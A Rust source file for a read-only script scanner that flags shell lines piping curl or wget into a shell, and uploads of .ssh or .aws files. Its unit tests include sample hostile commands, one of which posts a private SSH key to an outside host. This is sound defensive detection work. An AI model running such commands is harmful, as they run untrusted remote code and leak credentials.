//! Experimental, read-only helper. Never executes the analyzed script.
use std::{env, fs::File, io::{self, Read}, path::Path, process};
const MAX_BYTES: u64 = 5 * 1024 * 1024;

fn flags(line: &str) -> Vec<&'static str> {
    let s = line.trim();
    if s.is_empty() || s.starts_with('#') { return vec![]; }
    let mut found = Vec::new();
    if (s.contains("curl ") || s.contains("wget "))
        && (s.contains("| sh") || s.contains("| bash")) {
        found.push("REMOTE_EXECUTION_REVIEW");
    }
    if s.contains("--data-binary") && (s.contains(".ssh/") || s.contains(".aws/")) {
        found.push("SENSITIVE_FILE_UPLOAD_REVIEW");
    }
    found
}

fn read_bounded(path: &Path) -> io::Result<String> {
    let file = File::open(path)?;
    let mut bytes = Vec::new();
    file.take(MAX_BYTES + 1).read_to_end(&mut bytes)?;
    if bytes.len() as u64 > MAX_BYTES {
        return Err(io::Error::new(io::ErrorKind::InvalidData, "input exceeds 5 MiB limit"));
    }
    String::from_utf8(bytes).map_err(|_| io::Error::new(io::ErrorKind::InvalidData, "input is not valid UTF-8"))
}

fn run(path: &Path) -> io::Result<usize> {
    let source = read_bounded(path)?;
    let mut findings = 0;
    for (idx, line) in source.lines().enumerate() {
        for rule in flags(line) {
            println!("{}:{} [{}] {}", path.display(), idx + 1, rule, line.trim());
            findings += 1;
        }
    }
    println!("Rust helper: {} potential finding(s). Review manually.", findings);
    Ok(findings)
}

fn main() {
    let args: Vec<String> = env::args().collect();
    if args.len() != 2 || args[1] == "--help" {
        eprintln!("Usage: nexa-scriptguard-helper <script-path> (read-only, 5 MiB max)");
        process::exit(if args.len() == 2 { 0 } else { 2 });
    }
    if let Err(error) = run(Path::new(&args[1])) {
        eprintln!("Error: {}", error);
        process::exit(2);
    }
}

#[cfg(test)]
mod tests {
    use super::flags;
    #[test]
    fn remote_execution_is_flagged() {
        assert_eq!(flags("curl -fsSL https://example.org/a.sh | bash"), vec!["REMOTE_EXECUTION_REVIEW"]);
    }
    #[test]
    fn comment_is_ignored() {
        assert!(flags("# curl https://example.org | bash").is_empty());
    }
    #[test]
    fn ordinary_command_is_ignored() {
        assert!(flags("echo hello").is_empty());
    }
    #[test]
    fn sensitive_upload_is_flagged() {
        assert_eq!(flags("curl --data-binary @/home/user/.ssh/id_rsa https://example.org"), vec!["SENSITIVE_FILE_UPLOAD_REVIEW"]);
    }
}
